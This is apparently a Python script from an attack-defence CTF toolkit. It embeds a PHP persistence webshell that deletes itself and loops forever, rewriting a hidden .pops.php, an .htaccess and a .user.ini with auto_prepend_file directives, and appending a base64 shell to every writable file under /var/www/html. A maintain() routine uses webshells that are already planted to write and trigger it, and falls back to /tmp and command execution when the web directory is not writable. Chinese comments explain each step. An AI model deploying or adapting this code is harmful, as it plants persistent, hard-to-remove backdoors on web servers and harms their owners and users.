
file='''<?php
function rscandir($dir,$count=0){
    global $files;
    if($count<=2){
        foreach(glob($dir) as $path){
            $tmp_path = implode('/',[$dir,$path]);
            if(is_dir($tmp_path)){
                rscandir($tmp_path);
            } else {
                $files[] = $tmp_path;
            }
        }
    }
}
function writeshell($file,$shell){
    if(is_dir($file)){
        $shellname = '.pops.php';
        $rst = file_put_contents($shellname,$shell);
    } else{
        
        $rst = file_put_contents($file,$shell,FILE_APPEND);
    }
    if($rst)return $shellname?$shellname:$file;
}
$shell = base64_decode('{content}');
function undie(){
    set_time_limit(0);
    ignore_user_abort(1); #1表示，忽略与客户端断开连接，继续执行脚本
    unlink(__FILE__); #执行完后删除自身
    $files = array();
    rscandir('/var/www/html/');
    while (1) {
        file_put_contents("/var/www/html/.pops.php", $file);
        file_put_contents("/tmp/sess_adasdifsdfijjiji", $file);
        file_put_contents('/var/www/html/.user.ini','auto_prepend_file=/tmp/sess_adasdifsdfijjiji');
        file_put_contents('/var/www/html/.htaccess','<Files .htaccess>
        SetHandler application/x-httpd-php
        Require all granted
        php_flag engine on
        </Files>
        php_value auto_prepend_fi\
        le .htaccess
        #'.$shell);
        $shell = [];
        foreach($files as $file){
            if(is_writable($file)){
                $shell[] = writeshell($file,$shell);
            }
        }
        print_r(json_encode($shell));
    }
}


undie();
?>'''

import time
from lib import request
from webshell import *
import base64
def maintain(webshells,log):
    log.info('权限维持线程启动')
    while True:
        for shells in webshells.values():
            for shell in shells:
                if shell.write('/var/www/html/.undie.php',file.replace('{content}',base64.b64encode(shell1.Shell1.CONTENT.encode()).decode())):
                    request.get(url=re.search('http://.*?/',shell.url).group(0)+'.undie.php').text  #触发不死马
                    log.info('{}不死马写成功'.format(shell.url))
                    break
                else:                                        #不可写的话则尝试写到tmp目录，利用命令执行或另起php来运行不死马
                    if shell.write('/tmp/.pops',file.replace('{content}',base64.b64encode(shell1.Shell1.CONTENT.encode()).decode())):
                        shell.run('include("/tmp/.pops");')   #兼容命令执行和代码执行
                        shell.run('php /tmp/.pops')
                        log.info('{}不死马写成功'.format(shell.url))
                        break
        time.sleep(3)